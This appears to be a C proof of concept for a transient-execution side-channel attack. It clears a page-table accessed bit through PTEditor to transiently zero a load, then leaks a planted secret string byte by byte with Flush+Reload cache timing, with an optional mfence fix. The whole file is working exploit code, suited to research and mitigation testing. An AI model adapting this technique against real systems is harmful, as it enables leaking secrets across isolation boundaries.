#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <x86intrin.h>
#include <immintrin.h>

#include "cacheutils.h"

//#define FIX

#include "ptedit_header.h"

#define ITERATIONS 10000
#define SPACING 4096
#define MAX_STR_LEN 256

#define SECRET_STRING "This_is_an_1nacce551ble_S3cr3t!"
#define PUBLIC_STRING "Everyone can see this message."

typedef char glyph_t[4096];

__attribute__((aligned(4096)))
glyph_t shared_glyphs[256];

typedef struct {
  char secret_str[MAX_STR_LEN];
  char public_str[MAX_STR_LEN];
} victim_data_t;

victim_data_t victim_data;

__attribute__((aligned(4096)))
size_t victim_ptrs[512];

void init_victim() {
  victim_ptrs[0] = MAX_STR_LEN;  // this points to the PUBLIC STRING
  strcpy(victim_data.secret_str, SECRET_STRING);
  strcpy(victim_data.public_str, PUBLIC_STRING);
}

__attribute__((naked, sysv_abi))
void load_glyph(glyph_t* glyphs, 
    victim_data_t* victim_data_ptr, 
    size_t* str_idx, 
    size_t* str_offset) {
  // rdi := glyphs
  // rsi: victim_data_ptr
  // rdx: str_idx
  // rcx: str_offset
  asm volatile (INTELASM(
    // index the correct (public) string
    "adox rsi, [rdx]\n\t"  // POINT OF ATTACK :We transiently zero out this load
#ifdef FIX
    "mfence\n\t"
#endif

    // load str_offset and load current byte in RAX
    "add rsi, rcx\n\t"
    "mov rax, [rsi]\n\t"
    "and rax, 0xff\n\t"

    // dereference the corresponding glyph
    "shl rax, 12\n\t"  // * sizeof(glyph_t)
    "mov rax, [rdi + rax]\n\t"
    "ret\n\t"
  ));
}

void cache_data() {
  for (size_t i = 0; i < sizeof(victim_data); i += 64) {
    maccess((char*)&victim_data + i);
  }
}

void run_victim(size_t str_offset) {
  cache_data();
  load_glyph(shared_glyphs, &victim_data, victim_ptrs, str_offset);
}

void prepare() {
  for (size_t i = 0; i < 256; i++) {
    flush(&shared_glyphs[i]);
  }
  mfence();
}

int recover(size_t str_offset) {
  int hits = 0;
  for (size_t i = 0; i < 256; i++) {
    size_t idx = ((i * 167u) + 13u) & 255u;
    size_t delta = flush_reload_t(&shared_glyphs[idx]);
    if (delta < CACHE_MISS) {
      if (idx != PUBLIC_STRING[str_offset]) {
        return idx;
      }
      hits++;
    }
  }
  return -1;
}

void attack() {
  ptedit_pte_clear_bit(&victim_ptrs, 0, PTEDIT_PAGE_BIT_ACCESSED);
}

void init() {
  // touch memory to make sure its mapped
  memset(shared_glyphs, 1, sizeof(shared_glyphs));

  CACHE_MISS = detect_flush_reload_threshold() + 10;
  printf("Cache miss @ %zd\n", CACHE_MISS);

  if (ptedit_init()) {
    printf("PTEditor: init error. Aborting\n");
    exit(1);
  }

  init_victim();
}

int main(int argc, char* argv[]) {
  init();

  char leaked_str[256] = {0};
  for (int str_offset = 0; str_offset < sizeof(SECRET_STRING)-1; str_offset++) {
    int iter = 0;
    while (1) {
      iter++;
      prepare();
      for (int i = 0; i < 10000; i++) {
        attack();
        run_victim(str_offset);
      }
      int leaked_char = recover(str_offset);
      if (leaked_char != -1) {
        if (leaked_char > 128 || leaked_char < 0) {
          continue;
        }
        leaked_str[str_offset] = (char)leaked_char;
        break;
      }
    }  // iterations
    printf("\e[1;1H\e[2J");
    printf("[+] Current leak: %s\n", leaked_str);
  }
  exit(EXIT_SUCCESS);
}
